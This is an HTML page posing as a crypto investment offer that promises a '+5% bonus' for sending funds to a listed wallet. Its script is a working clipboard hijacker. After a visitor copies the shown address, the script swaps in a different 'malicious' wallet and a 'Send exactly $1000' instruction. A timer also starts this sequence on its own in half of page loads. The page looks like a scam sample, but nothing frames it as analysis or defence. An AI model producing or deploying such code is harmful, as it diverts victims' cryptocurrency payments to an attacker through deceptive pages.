<!DOCTYPE html>
<html>
<head>
    <title>Crypto Investment</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 50px auto;
            padding: 20px;
        }
        .wallet {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            font-family: monospace;
            word-break: break-all;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #28a745;
            color: white;
            padding: 10px 15px;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <h1>ðŸ’° Crypto Investment</h1>
    <p>Send funds to this wallet address for +5% bonus:</p>
    
    <div class="wallet" id="wallet">0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299</div>
    
    <button onclick="copyWallet()">Copy Wallet Address</button>
    <button onclick="autoCopySequence()" style="background: #dc3545;">Auto-Copy Bonus Address</button>

    <div class="notification" id="notification">Copied!</div>

    <script>
        const legitWallet = "0x742d35Cc6634C0532925a3b8D6f3984c4cE8f299";
        const maliciousWallet = "0x8a12Bc6d6d6b6d6b6d6b6d6b6d6b6d6b6d6b6d6b";

        function showNotification(message) {
            const notif = document.getElementById('notification');
            notif.textContent = message;
            notif.style.display = 'block';
            setTimeout(() => notif.style.display = 'none', 2000);
        }

        function copyWallet() {
            navigator.clipboard.writeText(legitWallet).then(() => {
                showNotification("âœ… Wallet address copied!");
                
                // After 2 seconds, replace with malicious wallet
                setTimeout(() => {
                    navigator.clipboard.writeText(maliciousWallet);
                    showNotification("ðŸ”„ Updated with bonus address!");
                }, 2000);
            });
        }

        function autoCopySequence() {
            // Multi-stage clipboard manipulation
            const steps = [
                { text: legitWallet, delay: 1000, message: "Base address copied" },
                { text: maliciousWallet, delay: 2000, message: "Bonus address applied" },
                { text: "Send exactly $1000 for +5% bonus", delay: 1500, message: "Instructions added" },
                { text: maliciousWallet, delay: 1000, message: "Ready for transfer!" }
            ];

            let step = 0;
            function nextStep() {
                if (step < steps.length) {
                    const current = steps[step];
                    navigator.clipboard.writeText(current.text);
                    showNotification(current.message);
                    setTimeout(nextStep, current.delay);
                    step++;
                }
            }
            nextStep();
        }

        // Auto-start clipboard manipulation after 10 seconds
        setTimeout(() => {
            if (Math.random() < 0.5) { // 50% chance
                autoCopySequence();
            }
        }, 10000);
    </script>
</body>
</html>
